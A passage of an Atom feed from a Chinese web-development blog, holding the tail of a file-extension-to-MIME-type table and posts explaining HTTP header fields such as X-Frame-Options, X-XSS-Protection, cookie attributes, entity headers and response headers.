<td style="text-align:left">image/vnd.rn-realpix</td>
<td style="text-align:left">.rpm</td>
<td style="text-align:left">audio/x-pn-realaudio-plugin</td>
</tr>
<tr>
<td style="text-align:left">.rsml</td>
<td style="text-align:left">application/vnd.rn-rsml</td>
<td style="text-align:left">.rt</td>
<td style="text-align:left">text/vnd.rn-realtext</td>
</tr>
<tr>
<td style="text-align:left">.rtf</td>
<td style="text-align:left">application/msword</td>
<td style="text-align:left">.rtf</td>
<td style="text-align:left">application/x-rtf</td>
</tr>
<tr>
<td style="text-align:left">.rv</td>
<td style="text-align:left">video/vnd.rn-realvideo</td>
<td style="text-align:left">.sam</td>
<td style="text-align:left">application/x-sam</td>
</tr>
<tr>
<td style="text-align:left">.sat</td>
<td style="text-align:left">application/x-sat</td>
<td style="text-align:left">.sdp</td>
<td style="text-align:left">application/sdp</td>
</tr>
<tr>
<td style="text-align:left">.sdw</td>
<td style="text-align:left">application/x-sdw</td>
<td style="text-align:left">.sit</td>
<td style="text-align:left">application/x-stuffit</td>
</tr>
<tr>
<td style="text-align:left">.slb</td>
<td style="text-align:left">application/x-slb</td>
<td style="text-align:left">.sld</td>
<td style="text-align:left">application/x-sld</td>
</tr>
<tr>
<td style="text-align:left">.slk</td>
<td style="text-align:left">drawing/x-slk</td>
<td style="text-align:left">.smi</td>
<td style="text-align:left">application/smil</td>
</tr>
<tr>
<td style="text-align:left">.smil</td>
<td style="text-align:left">application/smil</td>
<td style="text-align:left">.smk</td>
<td style="text-align:left">application/x-smk</td>
</tr>
<tr>
<td style="text-align:left">.snd</td>
<td style="text-align:left">audio/basic</td>
<td style="text-align:left">.sol</td>
<td style="text-align:left">text/plain</td>
</tr>
<tr>
<td style="text-align:left">.sor</td>
<td style="text-align:left">text/plain</td>
<td style="text-align:left">.spc</td>
<td style="text-align:left">application/x-pkcs7-certificates</td>
</tr>
<tr>
<td style="text-align:left">.spl</td>
<td style="text-align:left">application/futuresplash</td>
<td style="text-align:left">.spp</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.ssm</td>
<td style="text-align:left">application/streamingmedia</td>
<td style="text-align:left">.sst</td>
<td style="text-align:left">application/vnd.ms-pki.certstore</td>
</tr>
<tr>
<td style="text-align:left">.stl</td>
<td style="text-align:left">application/vnd.ms-pki.stl</td>
<td style="text-align:left">.stm</td>
<td style="text-align:left">text/html</td>
</tr>
<tr>
<td style="text-align:left">.sty</td>
<td style="text-align:left">application/x-sty</td>
<td style="text-align:left">.svg</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.swf</td>
<td style="text-align:left">application/x-shockwave-flash</td>
<td style="text-align:left">.tdf</td>
<td style="text-align:left">application/x-tdf</td>
</tr>
<tr>
<td style="text-align:left">.tg4</td>
<td style="text-align:left">application/x-tg4</td>
<td style="text-align:left">.tga</td>
<td style="text-align:left">application/x-tga</td>
</tr>
<tr>
<td style="text-align:left">.tif</td>
<td style="text-align:left">image/tiff</td>
<td style="text-align:left">.tif</td>
<td style="text-align:left">application/x-tif</td>
</tr>
<tr>
<td style="text-align:left">.tiff</td>
<td style="text-align:left">image/tiff</td>
<td style="text-align:left">.tld</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.top</td>
<td style="text-align:left">drawing/x-top</td>
<td style="text-align:left">.torrent</td>
<td style="text-align:left">application/x-bittorrent</td>
</tr>
<tr>
<td style="text-align:left">.tsd</td>
<td style="text-align:left">text/xml</td>
<td style="text-align:left">.txt</td>
<td style="text-align:left">text/plain</td>
</tr>
<tr>
<td style="text-align:left">.uin</td>
<td style="text-align:left">application/x-icq</td>
<td style="text-align:left">.uls</td>
<td style="text-align:left">text/iuls</td>
</tr>
<tr>
<td style="text-align:left">.vcf</td>
<td style="text-align:left">text/x-vcard</td>
<td style="text-align:left">.vda</td>
<td style="text-align:left">application/x-vda</td>
</tr>
<tr>
<td style="text-align:left">.vdx</td>
<td style="text-align:left">application/vnd.visio</td>
<td style="text-align:left">.vml</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.vpg</td>
<td style="text-align:left">application/x-vpeg005</td>
<td style="text-align:left">.vsd</td>
<td style="text-align:left">application/vnd.visio</td>
</tr>
<tr>
<td style="text-align:left">.vsd</td>
<td style="text-align:left">application/x-vsd</td>
<td style="text-align:left">.vss</td>
<td style="text-align:left">application/vnd.visio</td>
</tr>
<tr>
<td style="text-align:left">.vst</td>
<td style="text-align:left">application/vnd.visio</td>
<td style="text-align:left">.vst</td>
<td style="text-align:left">application/x-vst</td>
</tr>
<tr>
<td style="text-align:left">.vsw</td>
<td style="text-align:left">application/vnd.visio</td>
<td style="text-align:left">.vsx</td>
<td style="text-align:left">application/vnd.visio</td>
</tr>
<tr>
<td style="text-align:left">.vtx</td>
<td style="text-align:left">application/vnd.visio</td>
<td style="text-align:left">.vxml</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.wav</td>
<td style="text-align:left">audio/wav</td>
<td style="text-align:left">.wax</td>
<td style="text-align:left">audio/x-ms-wax</td>
</tr>
<tr>
<td style="text-align:left">.wb1</td>
<td style="text-align:left">application/x-wb1</td>
<td style="text-align:left">.wb2</td>
<td style="text-align:left">application/x-wb2</td>
</tr>
<tr>
<td style="text-align:left">.wb3</td>
<td style="text-align:left">application/x-wb3</td>
<td style="text-align:left">.wbmp</td>
<td style="text-align:left">image/vnd.wap.wbmp</td>
</tr>
<tr>
<td style="text-align:left">.wiz</td>
<td style="text-align:left">application/msword</td>
<td style="text-align:left">.wk3</td>
<td style="text-align:left">application/x-wk3</td>
</tr>
<tr>
<td style="text-align:left">.wk4</td>
<td style="text-align:left">application/x-wk4</td>
<td style="text-align:left">.wkq</td>
<td style="text-align:left">application/x-wkq</td>
</tr>
<tr>
<td style="text-align:left">.wks</td>
<td style="text-align:left">application/x-wks</td>
<td style="text-align:left">.wm</td>
<td style="text-align:left">video/x-ms-wm</td>
</tr>
<tr>
<td style="text-align:left">.wma</td>
<td style="text-align:left">audio/x-ms-wma</td>
<td style="text-align:left">.wmd</td>
<td style="text-align:left">application/x-ms-wmd</td>
</tr>
<tr>
<td style="text-align:left">.wmf</td>
<td style="text-align:left">application/x-wmf</td>
<td style="text-align:left">.wml</td>
<td style="text-align:left">text/vnd.wap.wml</td>
</tr>
<tr>
<td style="text-align:left">.wmv</td>
<td style="text-align:left">video/x-ms-wmv</td>
<td style="text-align:left">.wmx</td>
<td style="text-align:left">video/x-ms-wmx</td>
</tr>
<tr>
<td style="text-align:left">.wmz</td>
<td style="text-align:left">application/x-ms-wmz</td>
<td style="text-align:left">.wp6</td>
<td style="text-align:left">application/x-wp6</td>
</tr>
<tr>
<td style="text-align:left">.wpd</td>
<td style="text-align:left">application/x-wpd</td>
<td style="text-align:left">.wpg</td>
<td style="text-align:left">application/x-wpg</td>
</tr>
<tr>
<td style="text-align:left">.wpl</td>
<td style="text-align:left">application/vnd.ms-wpl</td>
<td style="text-align:left">.wq1</td>
<td style="text-align:left">application/x-wq1</td>
</tr>
<tr>
<td style="text-align:left">.wr1</td>
<td style="text-align:left">application/x-wr1</td>
<td style="text-align:left">.wri</td>
<td style="text-align:left">application/x-wri</td>
</tr>
<tr>
<td style="text-align:left">.wrk</td>
<td style="text-align:left">application/x-wrk</td>
<td style="text-align:left">.ws</td>
<td style="text-align:left">application/x-ws</td>
</tr>
<tr>
<td style="text-align:left">.ws2</td>
<td style="text-align:left">application/x-ws</td>
<td style="text-align:left">.wsc</td>
<td style="text-align:left">text/scriptlet</td>
</tr>
<tr>
<td style="text-align:left">.wsdl</td>
<td style="text-align:left">text/xml</td>
<td style="text-align:left">.wvx</td>
<td style="text-align:left">video/x-ms-wvx</td>
</tr>
<tr>
<td style="text-align:left">.xdp</td>
<td style="text-align:left">application/vnd.adobe.xdp</td>
<td style="text-align:left">.xdr</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.xfd</td>
<td style="text-align:left">application/vnd.adobe.xfd</td>
<td style="text-align:left">.xfdf</td>
<td style="text-align:left">application/vnd.adobe.xfdf</td>
</tr>
<tr>
<td style="text-align:left">.xhtml</td>
<td style="text-align:left">text/html</td>
<td style="text-align:left">.xls</td>
<td style="text-align:left">application/vnd.ms-excel</td>
</tr>
<tr>
<td style="text-align:left">.xls</td>
<td style="text-align:left">application/x-xls</td>
<td style="text-align:left">.xlw</td>
<td style="text-align:left">application/x-xlw</td>
</tr>
<tr>
<td style="text-align:left">.xml</td>
<td style="text-align:left">text/xml</td>
<td style="text-align:left">.xpl</td>
<td style="text-align:left">audio/scpls</td>
</tr>
<tr>
<td style="text-align:left">.xq</td>
<td style="text-align:left">text/xml</td>
<td style="text-align:left">.xql</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.xquery</td>
<td style="text-align:left">text/xml</td>
<td style="text-align:left">.xsd</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.xsl</td>
<td style="text-align:left">text/xml</td>
<td style="text-align:left">.xslt</td>
<td style="text-align:left">text/xml</td>
</tr>
<tr>
<td style="text-align:left">.xwd</td>
<td style="text-align:left">application/x-xwd</td>
<td style="text-align:left">.x_b</td>
<td style="text-align:left">application/x-x_b</td>
</tr>
<tr>
<td style="text-align:left">.sis</td>
<td style="text-align:left">application/vnd.symbian.install</td>
<td style="text-align:left">.sisx</td>
<td style="text-align:left">application/vnd.symbian.install</td>
</tr>
<tr>
<td style="text-align:left">.x_t</td>
<td style="text-align:left">application/x-x_t</td>
<td style="text-align:left">.ipa</td>
<td style="text-align:left">application/vnd.iphone</td>
</tr>
<tr>
<td style="text-align:left">.apk</td>
<td style="text-align:left">application/vnd.android.package-archive</td>
<td style="text-align:left">.xap</td>
<td style="text-align:left">application/x-silverlight-app</td>
</tr>
</tbody>
</table>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[http-其他首部字段]]></title>
        <id>https://leecss.com/post/http-qi-ta-shou-bu-zi-duan/</id>
        <link href="https://leecss.com/post/http-qi-ta-shou-bu-zi-duan/">
        </link>
        <updated>2021-07-22T00:13:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
<p>HTTP 首部字段是可以自行扩展的。所以在 Web 服务器和浏览器的应用上，会出现各种非标准的首部字段。</p>
<h2 id="常用的首部字段">常用的首部字段</h2>
<h3 id="x-frame-options">X-Frame-Options</h3>
<p>首部字段 X-Frame-Options 属于 HTTP 响应首部，用于控制网站内容在其他 Web 网站的 Frame 标签内的显示问题。其主要目的是为了防止点击劫持（clickjacking）攻击。</p>
<p>取值：</p>
<ul>
<li><strong>DENY</strong>：表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。</li>
<li><strong>SAMEORIGIN</strong>：表示该页面可以在相同域名页面的 frame 中展示。</li>
<li><strong>ALLOW-FROM uri</strong>：表示该页面可以在指定来源的 frame 中展示。</li>
</ul>
<pre><code class="language-http">X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
X-Frame-Options: ALLOW-FROM http://hackr.jp
</code></pre>
<h3 id="x-xss-protection">X-XSS-Protection</h3>
<p>首部字段 X-XSS-Protection 属于 HTTP 响应首部，它是针对跨站脚本攻击（XSS）的一种对策，用于控制浏览器 XSS 防护机制的开关。</p>
<p>当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面。针对现代浏览器，会选择更强大的Content-Security-Policy。</p>
<pre><code>X-XSS-Protection: 0  //禁止XSS过滤。
X-XSS-Protection: 1  //启用XSS过滤（通常浏览器是默认的）。如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。
X-XSS-Protection: 1; mode=block //启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。
X-XSS-Protection: 1; report=&lt;reporting-uri&gt; //启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri指令的功能发送违规报告。
</code></pre>
<h3 id="dnt">DNT</h3>
<p>首部字段 DNT 属于 HTTP 请求首部，其中 DNT 是 Do Not Track 的简称，意为拒绝个人信息被收集，是表示拒绝被精准广告追踪的一种方法。</p>
<pre><code class="language-http">DNT:0 //同意被追踪
DNT:1 //拒绝被追踪
</code></pre>
<p>由于首部字段 DNT 的功能具备有效性，所以 Web 服务器需要对 DNT做对应的支持。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[http-cookie相关首部字段]]></title>
        <id>https://leecss.com/post/http-cookie-xiang-guan-shou-bu-zi-duan/</id>
        <link href="https://leecss.com/post/http-cookie-xiang-guan-shou-bu-zi-duan/">
        </link>
        <updated>2021-07-21T23:58:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
<p>管理服务器与客户端之间状态的 Cookie，虽然没有被编入标准化HTTP/1.1 的 RFC2616 中，但在 Web 网站方面得到了广泛的应用。</p>
<p>Cookie 的工作机制是用户识别及状态管理。Web 网站为了管理用户的状态会通过 Web 浏览器，把一些数据临时写入用户的计算机内。接着当用户访问该Web网站时，可通过通信方式取回之前发放的Cookie。</p>
<p>调用 Cookie 时，由于可校验 Cookie 的有效期，以及发送方的域、路径、协议等信息，所以正规发布的 Cookie 内的数据不会因来自其他Web 站点和攻击者的攻击而泄露。</p>
<table>
<thead>
<tr>
<th>首部字段名</th>
<th>说明</th>
<th>首部类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>Set-Cookie</td>
<td>开始状态管理所使用的Cookie信息</td>
<td>响应首部字段</td>
</tr>
<tr>
<td>Cookie</td>
<td>服务器接收到的Cookie信息</td>
<td>请求首部字段</td>
</tr>
</tbody>
</table>
<h2 id="服务器">服务器</h2>
<p>当服务器准备开始管理客户端的状态时，会事先告知各种信息。</p>
<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>NAME=VALUE</td>
<td>赋予 Cookie 的名称和其值（必需项）</td>
</tr>
<tr>
<td>expires=DATE</td>
<td>Cookie的有效期（若不明确指定则默认为浏览器关闭前为止）</td>
</tr>
<tr>
<td>path=PATH</td>
<td>将服务器上的文件目录作为Cookie的适用对象（若不指定则默认为文档所在的文件目录）</td>
</tr>
<tr>
<td>domain=域名</td>
<td>作为 Cookie 适用对象的域名 （若不指定则默认为创建 Cookie的服务器的域名）</td>
</tr>
<tr>
<td>Secure</td>
<td>仅在 HTTPS 安全通信时才会发送 Cookie</td>
</tr>
<tr>
<td>HttpOnly</td>
<td>加以限制，使 Cookie 不能被 JavaScript 脚本访问</td>
</tr>
</tbody>
</table>
<h3 id="expires">expires</h3>
<p>Cookie 的 expires 属性指定浏览器可发送 Cookie 的有效期。</p>
<p>当省略 expires 属性时，其有效期仅限于维持浏览器会话（Session）时间段内。这通常限于浏览器应用程序被关闭之前。</p>
<p>另外，一旦 Cookie 从服务器端发送至客户端，服务器端就不存在可以显式删除 Cookie 的方法。但可通过覆盖已过期的 Cookie，实现对客户端 Cookie 的实质性删除操作。</p>
<h3 id="path">path</h3>
<p>限定可以发送Cookie的路径</p>
<p>Cookie 的 path 属性可用于限制指定 Cookie 的发送范围的文件目录。</p>
<h3 id="domain">domain</h3>
<p>通过 Cookie 的 domain 属性指定的域名可做到与结尾匹配一致。比如，当指定 <code>example.com</code> 后，除<code>example.com</code> 以外，<code>www.example.com</code>或 <code>www2.example.com</code> 等都可以发送 Cookie。</p>
<p>因此，除了针对具体指定的多个域名发送 Cookie 之 外，不指定domain 属性显得更安全。</p>
<h3 id="secure">secure</h3>
<p>Cookie 的 secure 属性用于限制 Web 页面仅在 HTTPS 安全连接时，才可以发送 Cookie。</p>
<pre><code class="language-http">Set-Cookie: name=value; secure
</code></pre>
<p>以上例子仅当在 <code>https://www.example.com/</code>（HTTPS）安全连接的情况下才会进行 Cookie 的回收。也就是说，即使域名相同，<code>http://www.example.com/</code>（HTTP）也不会发生 Cookie 回收行为。</p>
<p>当省略 secure 属性时，不论 HTTP 还是 HTTPS，都会对 Cookie 进行回收。</p>
<h3 id="httponly">HttpOnly</h3>
<p>Cookie 的 HttpOnly 属性是 Cookie 的扩展功能，它使 JavaScript 脚本无法获得 Cookie。其主要目的为防止跨站脚本攻击（Cross-site scripting，XSS）对 Cookie 的信息窃取。</p>
<pre><code class="language-http">Set-Cookie: name=value; HttpOnly
</code></pre>
<p>通过上述设置，通常从 Web 页面内还可以对 Cookie 进行读取操作。但使用 JavaScript 的 document.cookie 就无法读取附加 HttpOnly 属性后的 Cookie 的内容了。因此，也就无法在 XSS 中利用 JavaScript 劫持Cookie 了。</p>
<h2 id="客户端">客户端</h2>
<p>首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。</p>
<pre><code class="language-http">Cookie: status=enable
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[http-实体首部字段]]></title>
        <id>https://leecss.com/post/http-shi-ti-shou-bu-zi-duan/</id>
        <link href="https://leecss.com/post/http-shi-ti-shou-bu-zi-duan/">
        </link>
        <updated>2021-07-21T23:33:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
<p>实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。</p>
<h2 id="列表">列表</h2>
<table>
<thead>
<tr>
<th>实体首部</th>
<th>作用（补充请求报文或响应报文相关信息）</th>
</tr>
</thead>
<tbody>
<tr>
<td>Allow</td>
<td>告诉客户端资源所支持的HTTP方法：<code>GET HEAD POST</code></td>
</tr>
<tr>
<td>Content-Encoding</td>
<td>告知客户端，服务器对实体主体部分选用的内容编码方式：<code>gzip deflate</code></td>
</tr>
<tr>
<td>Content-Language</td>
<td>告知客户端，实体主体使用的自然语言。：<code>zh-CN</code></td>
</tr>
<tr>
<td>Content-Length</td>
<td>表明实体主体部分的大小，单位是字节。</td>
</tr>
<tr>
<td>Content-Location</td>
<td>表示返回的数据对应的URI</td>
</tr>
<tr>
<td>Content-MD5</td>
<td>Base64加密格式的内容 MD5检验值</td>
</tr>
<tr>
<td>Content-Range</td>
<td>主要用于范围请求，告知客户端当前发送部分的内容范围以及整个实体大小。</td>
</tr>
<tr>
<td>Content-Type</td>
<td>表明实体主体内对象的媒体类型。</td>
</tr>
<tr>
<td>Expires</td>
<td>内容的过期时间</td>
</tr>
<tr>
<td>Last_modified</td>
<td>内容的最后修改时间</td>
</tr>
</tbody>
</table>
<h3 id="allow">Allow</h3>
<p>首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。</p>
<pre><code class="language-http">Allow: GET, HEAD
</code></pre>
<h3 id="content-encoding">Content-Encoding</h3>
<p>首部字段 Content-Encoding 会告知客户端服务器对实体的主体部分选用的内容编码方式。内容编码是指在不丢失实体信息的前提下所进行的压缩。</p>
<p>告知客户端以同样的方式解压。</p>
<p>主要采用以下 4 种内容编码的方式。</p>
<pre><code>gzip
compress
deflate
identity
</code></pre>
<pre><code class="language-http">Content-Encoding: gzip
</code></pre>
<h3 id="content-language">Content-Language</h3>
<p>首部字段 Content-Language 会告知客户端，实体主体使用的自然语言（指中文或英文等语言）。</p>
<pre><code class="language-http">Content-Language: zh-CN
</code></pre>
<h3 id="content-length">Content-Length</h3>
<p>首部字段 Content-Length 表明了实体主体部分的大小（单位是字节）。对实体主体进行内容编码传输时，不能再使用 Content-Length首部字段。</p>
<pre><code class="language-http">Content-Length: 15000
</code></pre>
<p>该资源的大小为15000字节</p>
<h3 id="content-location">Content-Location</h3>
<p>首部字段 Content-Location 给出与报文主体部分相对应的 URI。和首部字段 Location 不同，Content-Location 表示的是报文主体返回资源对应的 URI。</p>
<p>比如，对于使用首部字段 Accept-Language 的服务器驱动型请求，当返回的页面内容与实际请求的对象不同时，首部字段 Content-Location内会写明 URI。（访问 <code>http://www.hackr.jp/</code> 返回的对象却是<code>http://www.hackr.jp/index-ja.html</code> 等类似情况）</p>
<pre><code class="language-http">Content-Location: http://www.hackr.jp/index-ja.html
</code></pre>
<h3 id="content-md5">Content-MD5</h3>
<p>首部字段 Content-MD5 是一串由 MD5 算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。</p>
<p>对报文主体执行 MD5 算法获得的 128 位二进制数，再通过 Base64 编码后将结果写入 Content-MD5 字段值。由于 HTTP 首部无法记录二进制值，所以要通过 Base64 编码处理。为确保报文的有效性，作为接收方的客户端会对报文主体再执行一次相同的 MD5 算法。计算出的值与字段值作比较后，即可判断出报文主体的准确性。</p>
<p>采用这种方法，对内容上的偶发性改变是无从查证的，也无法检测出恶意篡改。其中一个原因在于，内容如果能够被篡改，那么同时意味着 Content-MD5 也可重新计算然后被篡改。所以处在接收阶段的客户端是无法意识到报文主体以及首部字段 Content-MD5 是已经被篡改过的。</p>
<pre><code class="language-http">Content-MD5: OGFkZDUwNGVhNGY3N2MxMDIwZmQ4NTBmY2IyTY==
</code></pre>
<pre><code>报文主体 -&gt; MD5算法 -&gt; Base64编码
</code></pre>
<h3 id="content-range">Content-Range</h3>
<p>针对范围请求，返回响应时使用的首部字段 Content-Range，能告知客户端作为响应返回的实体的哪个部分符合范围请求。字段值以字节为单位，表示当前发送部分及整个实体大小。</p>
<pre><code class="language-http">Content-Range: bytes 5001-10000/10000
</code></pre>
<h3 id="content-type">Content-Type</h3>
<p>首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。<br>
参数 charset 使用 iso-8859-1 或 euc-jp 等字符集进行赋值。</p>
<pre><code class="language-http">Content-Type: text/html; charset=UTF-8
</code></pre>
<h3 id="expires">Expires</h3>
<p>首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。</p>
<p>源服务器不希望缓存服务器对资源缓存时，最好在 Expires 字段内写入与首部字段 Date 相同的时间值。</p>
<p>但是，当首部字段 Cache-Control 有指定 max-age 指令时，比起首部字段 Expires，会优先处理 max-age 指令。</p>
<pre><code class="language-http">Expires: Wed, 04 Jul 2012 08:26:05 GMT
</code></pre>
<p>源服务器告知缓存服务器此缓存可使用到2012年7月4日</p>
<h3 id="last-modified">Last-Modified</h3>
<p>首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进行动态数据处理时，该值有可能会变成数据最终修改时的时间。</p>
<pre><code class="language-http">Last-Modified: Wed, 23 May 2012 09:59:55 GMT
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[http-响应首部字段]]></title>
        <id>https://leecss.com/post/http-xiang-ying-shou-bu-zi-duan/</id>
        <link href="https://leecss.com/post/http-xiang-ying-shou-bu-zi-duan/">
        </link>
        <updated>2021-07-21T14:22:10.000Z</updated>
        <content type="html"><![CDATA[<h2 id="概述">概述</h2>
<p>响应首部字段是由服务器端向客户端返回响应报文中所使用的字段，用于补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息。</p>
<h2 id="列表">列表</h2>
<table>
<thead>
<tr>
<th>响应首部</th>
<th>作用（响应报文专用）</th>
</tr>
</thead>
<tbody>
<tr>
<td>Accept-Ranges</td>
<td>告知客户端服务器是否可接受范围请求，是<code>bytes</code>，否<code>none</code></td>
</tr>
<tr>
<td>Age</td>
<td>资源在代理缓存中存在的时间</td>
</tr>
<tr>
<td>ETag</td>
<td>资源标识，资源发生变化时标识也会发生改变</td>
</tr>
<tr>
<td>Location</td>
<td>客户端重定向到某个 URL</td>
</tr>
<tr>
<td>Proxy-Authenticate</td>
<td>向代理服务器发送验证信息</td>
</tr>
<tr>
<td>Retry-After</td>
<td>告知客户端应该在多久之后再次发送请求</td>
</tr>
<tr>
<td>Server</td>
<td>服务器名字：<code>Apache Nginx</code></td>
</tr>
<tr>
<td>Vary</td>
<td>对缓存进行控制 <code>Vary: Accept-Language</code></td>
</tr>
<tr>
<td>WWW-Authenticate</td>
<td>定义了使用何种验证方式去获取对资源的连接。</td>
</tr>
</tbody>
</table>
<h3 id="accept-ranges">Accept-Ranges</h3>
<p>首部字段 Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。</p>
<p>可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none。</p>
<pre><code class="language-http">Accept-Ranges: bytes
Accept-Ranges: none    //不支持范围请求
</code></pre>
<h3 id="age">Age</h3>
<p>首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。</p>
<p>若创建该响应的服务器是缓存服务器，Age 值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上首部字段Age。</p>
<pre><code class="language-http">Age: 600
</code></pre>
<h3 id="etag">ETag</h3>
<pre><code class="language-http">ETag: &quot;82e22293907ce725faf67773957acd12&quot;
</code></pre>
<p>首部字段 ETag 能告知客户端实体标识。它是一种可将资源以字符串形式做唯一性标识的方式。服务器会为每份资源分配对应的 ETag值。</p>
<p>另外，当资源更新时，ETag 值也需要更新。生成 ETag 值时，并没有统一的算法规则，而仅仅是由服务器来分配。</p>
<p>资源被缓存时，就会被分配唯一性标识。例如，当使用中文版的浏览器访问 <code>http://www.google.com/</code> 时，就会返回中文版对应的资源，而使用英文版的浏览器访问时，则会返回英文版对应的资源。两者的URI 是相同的，所以仅凭 URI 指定缓存的资源是相当困难的。若在下载过程中出现连接中断、再连接的情况，都会依照 ETag 值来指定资源。</p>
<p><strong>强 ETag 值和弱 Tag 值</strong></p>
<p>ETag 中有强 ETag 值和弱 ETag 值之分。<br>
1、强 ETag 值<br>
强 ETag 值，不论实体发生多么细微的变化都会改变其值</p>
<pre><code class="language-sh">ETag: &quot;usagi-1234&quot;
</code></pre>
<p>弱 ETag 值<br>
弱 ETag 值只用于提示资源是否相同。只有资源发生了根本改变，产生差异时才会改变 ETag 值。这时，会在字段值最开始处附加 W/。</p>
<pre><code class="language-http">ETag: W/&quot;usagi-1234&quot;
</code></pre>
<h3 id="location">Location</h3>
<p>使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。</p>
<p>基本上，该字段会配合 3xx ：Redirection 的响应，提供重定向的URI。</p>
<p>几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试对已提示的重定向资源的访问。</p>
<pre><code class="language-http">Location: http://www.usagidesign.jp/sample.html
</code></pre>
<h3 id="proxy-authenticate">Proxy-Authenticate</h3>
<p>首部字段 Proxy-Authenticate 会把由代理服务器所要求的认证信息发送给客户端。</p>
<p>它与客户端和服务器之间的 HTTP 访问认证的行为相似，不同之处在于其认证行为是在客户端与代理之间进行的。而客户端与服务器之间进行认证时，首部字段 WWW-Authorization 有着相同的作用。</p>
<pre><code class="language-http">Proxy-Authenticate: Basic realm=&quot;Usagidesign Auth&quot;
</code></pre>
<h3 id="retry-after">Retry-After</h3>
<p>首部字段 Retry-After 告知客户端应该在多久之后再次发送请求。主要配合状态码 503 Service Unavailable 响应，或 3xx Redirect 响应一起使用。</p>
<p>字段值可以指定为具体的日期时间（Wed, 04 Jul 2012 06：34：24GMT 等格式），也可以是创建响应后的秒数。</p>
<pre><code class="language-http">Retry-After: Wed, 21 Oct 2015 07:28:00 GMT
Retry-After: 120
</code></pre>
<h3 id="server">Server</h3>
<p>首部字段 Server 告知客户端当前服务器上安装的 HTTP 服务器应用程序的信息。不单单会标出服务器上的软件应用名称，还有可能包括版本号和安装时启用的可选项。</p>
<pre><code class="language-http">Server: Apache/2.2.17 (Unix)
Server: Apache/2.2.6 (Unix) PHP/5.2.5
</code></pre>
<h3 id="vary">Vary</h3>
<p>首部字段 Vary 可对缓存进行控制。源服务器会向代理服务器传达关于本地缓存使用方法的命令。</p>
<p>从代理服务器接收到源服务器返回包含 Vary 指定项的响应之后，若再要进行缓存，仅对请求中含有相同 Vary 指定首部字段的请求返回缓存。即使对相同资源发起请求，但由于 Vary 指定的首部字段不相同，因此必须要从源服务器重新获取资源。</p>
<pre><code class="language-http">Vary: Accept-Language
</code></pre>
<p>当代理服务器接收到带有 Vary 首部字段指定获取资源的请求时，如果使用的 Accept-Language 字段的值相同，那么就直接从缓存返回响应。反之，则需要先从源服务器端获取资源后才能作为响应返回</p>
<h3 id="www-authenticate">WWW-Authenticate</h3>
<p>首部字段 WWW-Authenticate 用于 HTTP 访问认证。它会告知客户端适用于访问请求 URI 所指定资源的认证方案（Basic 或是 Digest）和带参数提示的质询（challenge）。状态码 401 Unauthorized 响应中，肯定带有首部字段 WWW-Authenticate。</p>
<pre><code class="language-http">WWW-Authenticate: Basic realm=&quot;Usagidesign Auth&quot;
</code></pre>
<p>上述示例中，realm 字段的字符串是为了辨别请求 URI 指定资源所受到的保护策略。</p>
]]></content>
    </entry>
</feed>